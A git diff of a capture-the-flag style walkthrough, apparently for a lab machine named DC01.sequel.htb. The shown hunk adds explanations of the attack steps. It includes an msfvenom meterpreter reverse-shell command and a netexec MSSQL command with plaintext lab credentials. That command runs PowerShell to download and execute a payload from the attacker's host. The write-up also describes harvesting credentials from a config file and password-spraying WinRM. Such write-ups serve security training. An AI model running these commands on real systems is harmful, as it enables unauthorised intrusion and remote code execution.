@@ -141,23 +141,26 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=667 -f exe -o meter
 
 Now setup the listener on `msfconsole` using `multi/handler` module.
 
+
+Start the python server on kali machine and download the *meterpreter* shell on the target machine with this powershell script
 ```bash
 netexec mssql DC01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X "powershell -c \"mkdir C:\\TEMP; Invoke-WebRequest -Uri http://10.10.14.85:8000/meterpreter.exe -OutFile C:\\TEMP\\ciccio.exe; Start-Process C:\\TEMP\\ciccio.exe\"" --verbose
 ```
 
 ![](../../../../Assest/Pasted%20image%2020250721011545.png)
 
-!TODO: explain the powershell script
+- `mkdir C:\\TEMP`: Create the temp folder 
+- `Invoke-WebRequest -Uri http://10.10.14.85:8000/meterpreter.exe -OutFile C:\\TEMP\\ciccio.exe`: Download the **meterpreter.exe** from kali machine and save in ciccio.exe under C:\\temp
+- `Start-Process C:\\TEMP\\ciccio.exe\`: Execute the **ciccio** PE.
 
 ![](../../../../Assest/Pasted%20image%2020250721011531.png)
 
 Now under the  `C:\SQL2019\ExpressAdv_ENU` installation folder of MSSQL we can see the `sql-Configuration.INI` file that contains `sql_svc` user's credentials.
 
 ![](../../../../Assest/Pasted%20image%2020250721012901.png)
-!TODO: How to create a users list
-!TODO: spray attack with founded password (i cant log in with `sql_svc` user)
-![](../../../../Assest/Pasted%20image%2020250724205831.png)
 
+Now we need to create a users list, we can include the users founded in *xlxs* files and the `ryan` user founded on `users` directory of the target machine
+![](../../../../Assest/Pasted%20image%2020250724205831.png)
 
 As we see during the port scanning  the `5985` port is open. This port typically is used by the [`winrm` service](https://www.speedguide.net/port.php?port=5985).  we can try to brute force our users list with the password founded in the SQL config file
 ```bash
